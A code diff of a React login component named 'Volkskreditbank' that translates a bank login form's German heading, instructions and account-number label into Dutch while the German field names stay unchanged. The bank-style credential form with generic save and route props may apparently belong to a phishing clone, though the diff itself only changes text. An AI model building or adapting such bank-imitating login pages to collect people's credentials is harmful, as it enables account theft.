@@ -45,10 +45,10 @@ export function Volkskreditbank({ formData, onChange, handleRouteAction, saving 
 
           {/* Heading & Subtext */}
           <h1 className="text-[26px] md:text-[28px] font-normal text-[#333] mb-3 tracking-tight">
-            Bitte melden Sie sich an
+            Log alstublieft in
           </h1>
           <p className="text-[14px] text-[#555] mb-8">
-            Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
+            Voer uw inloggegevens in om verder te gaan.
           </p>
 
           <form 
@@ -69,11 +69,11 @@ export function Volkskreditbank({ formData, onChange, handleRouteAction, saving 
               </svg>
             </div>
 
-            {/* Verfügernummer */}
+            {/* Inlogcode */}
             <div className={`relative w-full bg-[#f3f4f6] pt-2 pb-1.5 px-3 mb-5 transition-colors focus-within:bg-[#ebebeb] ${
               formData.verfuegernummer ? 'border-b-2 border-[#8bd05f]' : 'border-b border-[#aaa]'
             }`}>
-              <label className="block text-[12px] text-[#666] mb-0.5">Verfügernummer eingeben *</label>
+              <label className="block text-[12px] text-[#666] mb-0.5">Inlogcode invoeren *</label>
               <input 
                 type="text"
                 value={formData.verfuegernummer || ""}
